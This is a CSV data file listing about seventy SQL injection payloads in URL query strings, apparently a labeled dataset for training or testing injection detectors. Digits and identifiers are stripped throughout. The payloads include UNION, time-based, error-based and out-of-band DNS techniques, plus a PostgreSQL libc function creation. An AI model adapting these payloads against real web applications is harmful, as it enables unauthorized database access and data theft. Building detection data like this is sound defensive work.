,language,source
2001,sql,". . . . / / / / ? = ' ) union all select null , null , null , null , null , null , null , null -- "
2002,sql,". . . / / ? = "" ; select ( case when ( = ) then else / ( select ) end ) --"
2003,sql,". . / / / ? = & = - "" order by # "
2004,sql,". . . / / / / ? = & = ' ) ; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual --"
2005,sql,". . / / / ? = & = ) and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( = "
2006,sql,". . . / / / ? = & = & = & = ) and = and ( = "
2007,sql,". . . / / ? = ' ) ) ; ( select * from ( select ( sleep ( ) ) ) bcts ) # "
2008,sql,". . / / ? = & = & = & = union all select null # "
2009,sql,". . . / / / / ? = & = "" ) ) and = ( select upper ( xmltype ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) from dual ) and ( ( " edrc " = " "
2010,sql,". . . / / / / ? = "" ) ) and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ( ( " stmb " = " "
2011,sql,". . . / / / ? = & = & = % "" union all select null , null , null , null , null , null , null , null -- "
2012,sql,". . . . ? = & = & = ' ) and ( select * from ( select ( sleep ( ) ) ) zhty ) and ( ' qgpi ' like ' "
2013,sql,". . . . / / / / ? = & = & = "" and sleep ( ) # "
2014,sql,". . . . / / / ? = & = % ' ) rlike sleep ( ) and ( ' % ' = ' "
2015,sql,". . . . / / / ? = "" and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and " qpwe " = " "
2016,sql,". . / / / / ? = & = ' ) ) and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ( ( ' ythb ' like ' "
2017,sql,". . / / / ? = & = & = ) and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( = "
2018,sql,". . . . / / / ? = "" ) ) union all select null , null , null , null , null -- "
2019,sql,". . / / ? = & = & = % ' and = -- "
2020,sql,". . . . / / / / ? = & = & = & = order by -- "
2021,sql,". . . . / / / / ? = ) ) ) and = and ( ( ( = "
2022,sql,". . . . / / / / ? = & = & = ' ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ' utzj ' = ' "
2023,sql,". . . / / / ? = & = union all select null , null , null -- "
2024,sql,". . . / / ? = & = & = "" ; select pg_sleep ( ) --"
2025,sql,". . . . ? = & = & = & = and = -- "
2026,sql,". . . / / / / ? = & = & = & = ) and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) -- "
2027,sql,". . / / ? = & = - ) union all select -- "
2028,sql,". . ? = & = & = ; select ( case when ( = ) then else / ( select ) end ) --"
2029,sql,". . . ? = & = "" ) ) ; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual --"
2030,sql,". . ? = & = "" ) order by -- "
2031,sql,". . . / / / / ? = ; select sleep ( ) # "
2032,sql,". . . / / / ? = & = - order by # "
2033,sql,". . . . / / ? = & = & = - ' ) ) union all select , , -- "
2034,sql,". . . / / / / ? = - ' union all select , , , , -- "
2035,sql,". . . / / / / ? = & = & = - % ' ) union all select , , , , , , , , , -- "
2036,sql,". . / / / ? = & = "" ) and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( " luuw " = " "
2037,sql,". . . / / / / ? = & = ' ) ) and = ( select upper ( xmltype ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) from dual ) and ( ( ' uusg ' like ' "
2038,sql,". . . ? = "" ) ) and = -- "
2039,sql,". . . . / / ? = & = ' ) ) rlike ( select ( case when ( = ) then xcdfeecaffcdef else x end ) ) and ( ( ' rcvj ' like ' "
2040,sql,". . . / / ? = & = & = & = ' ) ) and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ( ( ' yayj ' = ' "
2041,sql,". . ? = ) ) union all select null , null , null # "
2042,sql,". . . . / ? = & = & = & = ) union all select null , null , null , null , null , null , null # "
2043,sql,". . . ? = "" union all select null , null , null , null , null , null -- "
2044,sql,". . / / / / ? = & = % ' and = and ' % ' = ' "
2045,sql,". . . ? = & = & = ' and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ' odqr ' like ' "
2046,sql,". . / / ? = & = & = ( case when ( = ) then ' ' else * ( select from dual union select from dual ) end ) "
2047,sql,". . . . ? = & = ' ) ) and sleep ( ) # "
2048,sql,". . . . / / / ? = & = - ' union all select , , , , , , , , # "
2049,sql,". . . / / / / ? = & = "" ) and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( " fbpa " like " "
2050,sql,". . . ? = & = & = and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) -- "
2051,sql,". . . . / ? = & = & = % "" rlike ( select ( case when ( = ) then else x end ) ) and " % " = " "
2052,sql,". . . / ? = & = & = ' ) ) union all select null , null # "
2053,sql,". . . . ? = & = % ' ) ) and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and ( ( ' % ' = ' "
2054,sql,". . . / / ? = & = ' and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ' sdpf ' like ' "
2055,sql,". . . / ? = & = & = % "" and make_set ( = , ) and " % " = " "
2056,sql,". . . . ? = & = & = and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) "
2057,sql,". . . . / / / / ? = & = ( case when ( = ) then sleep ( ) else end ) "
2058,sql,". . ? = & = & = & = ' ) and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ( ' clie ' like ' "
2059,sql,". . / / ? = - ' ) ) union all select , , , , , , -- "
2060,sql,". . / / ? = ) order by # "
2061,sql,". . . / / / ? = & = "" ) ) union all select null , null , null , null , null # "
2062,sql,". . . / / / ? = & = & = & = "" and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and " dhcg " like " "
2063,sql,". . . . / ? = & = & = & = ) ) ; create or replace function sleep ( int ) returns int as ' / lib / libc . so . ' , ' sleep ' language ' c ' strict ; select sleep ( ) --"
2064,sql,". . . / ? = & = & = ' ) union all select null # "
2065,sql,". . / ? = - % ' ) order by # "
2066,sql,". . . / / ? = & = & = ' ) and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ( ' qpyk ' like ' "
2067,sql,". . ? = & = & = ) ) ) union all select null , null , null # "
2068,sql,". . . / ? = & = "" ) and = ( ' qpvbq ' | | ( select case when then else end from rdb$database ) | | ' qvkjq ' ) and ( " onyw " = " "
2069,sql,". . ? = & = % ' ) union all select null , null , null -- "
2070,sql,". . / / / ? = & = "" and = ctxsys . drithsx . sn ( , ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) and " jmtm " like " "
2071,sql,". . . / / / / ? = & = % "" union all select null , null , null , null , null , null , null , null # "
2072,sql,". . . / ? = & = & = & = ' ) ) ) and make_set ( = , ) and ( ( ( ' fqbn ' = ' "
2073,sql,". . . . / / / / ? = & = & = & = ' ) union all select null , null , null , null , null , null , null -- "
